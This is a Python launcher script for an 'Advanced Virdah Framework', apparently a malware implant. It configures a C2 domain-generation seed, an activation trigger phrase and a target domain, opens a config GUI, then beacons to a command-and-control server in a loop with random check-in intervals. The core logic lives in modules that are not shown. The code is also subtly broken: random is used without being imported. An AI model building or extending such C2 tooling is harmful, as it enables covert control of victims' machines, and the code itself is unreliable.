import json
import time
import argparse
import tkinter as tk
from gui import ConfigGUI
from advanced_virdah import AdvancedVirdah

def load_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
        print("Config loaded successfully.")
        return config
    except Exception as e:
        print(f"Error loading config: {e}")
        return None

def initialize(config):
    if config:
        print("Initializing with the loaded configuration...")
        return config
    else:
        print("Failed to initialize configuration.")
        return None

if __name__ == "__main__":
    config = load_config()
    if config:
        config = initialize(config)
        parser = argparse.ArgumentParser(description="Advanced Virdah Framework")
        parser.add_argument("--seed", default=config.get("c2_seed"), help="C2 domain generation seed")
        parser.add_argument("--trigger", default=config.get("activation_trigger"), help="Activation trigger phrase")
        parser.add_argument("--target-domain", default=config.get("target_domain"), help="Target domain for C2 communication")
        args = parser.parse_args()

        virdah = AdvancedVirdah(args.seed, args.trigger)
        
        # تشغيل الواجهة الرسومية
        root = tk.Tk()
        gui = ConfigGUI(root, config, load_config)
        root.mainloop()

        while virdah.init_complete:
            virdah.connect_c2()
            time.sleep(random.randint(300, 900))  # Random check-in interval
